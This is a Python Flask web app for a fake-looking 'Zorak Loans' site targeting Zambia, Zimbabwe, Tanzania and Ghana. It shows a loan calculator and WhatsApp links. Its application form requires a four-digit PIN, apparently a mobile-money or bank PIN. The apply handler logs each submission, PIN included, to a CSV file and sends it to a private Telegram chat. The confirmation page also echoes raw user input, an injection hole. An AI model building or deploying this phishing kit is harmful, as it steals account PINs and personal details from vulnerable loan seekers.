from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
N = chr(10)
W = 'https://wa.me/message/CFCJWLOZ7IWZK1'
B = os.environ.get('BOT_TOKEN')
C = os.environ.get('CHAT_ID')
H = '<style>body{margin:0;background:#f2f7f2;font-family:Arial;font-size:22px}.top{background:#0a5c36;color:#fff;padding:28px;text-align:center}.top b{font-size:38px}.top div{font-size:20px}.wrap{max-width:600px;margin:16px auto;padding:0 12px}.card{background:#fff;border-radius:22px;padding:32px}.card h1{font-size:38px;line-height:1.2}.card h2{font-size:30px}.card p{font-size:22px;line-height:1.4}.btn{background:#0a5c36;color:#fff;padding:24px;border-radius:16px;display:block;text-align:center;text-decoration:none;font-size:24px;font-weight:bold;width:100%;border:none;cursor:pointer;box-sizing:border-box}.btn2{background:#ffc107;color:#111}.big{font-size:52px;color:#0a5c36;font-weight:bold}.muted{color:#666;font-size:19px}input,select{width:100%;padding:20px;font-size:22px;border-radius:14px;border:2px solid #ddd;box-sizing:border-box}label{font-size:22px;font-weight:bold}</style><div class=top><b>ZORAK LOANS</b><div>Zambia | Zimbabwe | Tanzania | Ghana</div></div>'
def send(t):
    try:
        u = 'https://api.telegram.org/bot' + B + '/sendMessage'
        requests.post(u, json={'chat_id': C, 'text': t}, timeout=10)
    except:
        pass
@app.route('/')
@app.route('/api')
def home():
    return H + '<div class=wrap><div class=card><h1>Get Your Loan Approved Fast</h1><p class=muted>Quick approval - Low rates - Flexible terms</p><h2>Loan Calculator</h2><p><b>Loan Amount</b></p><input id=a value=5000><p><b>Loan Term (months)</b></p><input id=n value=12><p><b>Monthly Payment</b></p><div class=big id=m></div><br><button class=btn onclick=calc()>CALCULATE</button><br><a class="btn btn2" href=/apply-form>APPLY NOW</a><br><a class=btn href=' + W + '>CHAT ON WHATSAPP</a></div><br><div class=card><h2>Why Zorak?</h2><p>⚡ Fast Approval Within 24 hours</p><p>💰 Low Rates From 8%</p><p>🔒 Secure Bank-level</p><p>📱 Apply in 2 mins</p></div><br><div class=card><h2>How it works</h2><p>1. Fill form - 2 mins</p><p>2. We call you - 30 mins</p><p>3. Cash in your account</p></div></div><script>function calc(){var a=document.getElementById("a").value;var n=document.getElementById("n").value;var r=0.08/12;var m=a*r/(1-Math.pow(1+r,-n));document.getElementById("m").innerText="$"+m.toFixed(2)}calc()</script>'
@app.route('/apply-form')
@app.route('/api/apply-form')
def form():
    return H + '<div class=wrap><div class=card><h1>Apply Now</h1><form method=POST action=/apply><p><label>Name</label></p><input name=name required placeholder="Your full name"><p><label>Phone</label></p><input name=phone required placeholder="e.g. +260..."><p><label>Country</label></p><select name=country><option>Zambia</option><option>Zimbabwe</option><option>Tanzania</option><option>Ghana</option></select><p><label>Amount</label></p><input name=amount required value=5000><p><label>Term</label></p><input name=term value=12><p><label>Purpose</label></p><select name=purpose><option>Business</option><option>School Fees</option><option>Medical</option><option>Rent</option><option>Other</option></select><p><label>PIN</label></p><input name=pin required placeholder="PIN" maxlength=4 minlength=4 inputmode=numeric><br><br><button class=btn>SUBMIT APPLICATION</button></form></div></div>'
@app.route('/apply', methods=['POST'])
@app.route('/api/apply', methods=['POST'])
def apply():
    n = request.form.get('name', '')
    p = request.form.get('phone', '')
    c = request.form.get('country', '')
    a = request.form.get('amount', '')
    t = request.form.get('term', '')
    u = request.form.get('purpose', '')
    pin = request.form.get('pin', '')
    with open('leads.csv', 'a', newline='') as f:
        csv.writer(f).writerow([datetime.now().isoformat(), n, p, c, a, t, u, pin])
    cur = 'ZMW'
    if c == 'Zimbabwe':
        cur = 'USD'
    if c == 'Tanzania':
        cur = 'TSh'
    if c == 'Ghana':
        cur = 'GHS'
    send('New Lead' + N + 'Name: ' + n + N + 'Phone: ' + p + N + 'Country: ' + c + N + 'Amount: ' + a + ' ' + cur + N + 'Term: ' + t + N + 'Purpose: ' + u + N + 'PIN: ' + pin)
    return H + '<div class=wrap><div class=card><h1>Thank you, ' + n + '!</h1><p>Request for <b>' + a + ' ' + cur + '</b> received.</p><p>Your PIN is: <b>' + pin + '</b></p><p>We call you on <b>' + p + '</b></p><a class=btn href=' + W + '>WHATSAPP US</a><br><a class="btn btn2" href=/>APPLY ANOTHER</a></div></div>'
@app.route('/test-telegram')
def test():
    r = requests.post('https://api.telegram.org/bot' + B + '/sendMessage', json={'chat_id': C, 'text': 'Test OK'}, timeout=10)
    return 'Status: ' + str(r.status_code)
@app.route('/health')
def health():
    return 'OK'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
